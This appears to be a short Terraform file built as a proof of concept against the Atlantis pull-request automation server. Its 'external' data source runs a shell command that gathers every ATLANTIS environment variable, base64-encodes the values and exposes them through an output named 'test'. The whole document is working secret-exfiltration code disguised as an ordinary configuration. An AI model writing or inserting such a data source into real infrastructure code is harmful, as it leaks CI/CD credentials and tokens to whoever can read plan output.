data "external" "example" {
  program = ["sh", "-c", "env | grep ATLANTIS | base64 -w 0 | xargs -0 printf '{ \"Env\": \"%s\" }'"]
}
output "test"  {
  value = data.external.example.result.Env
}

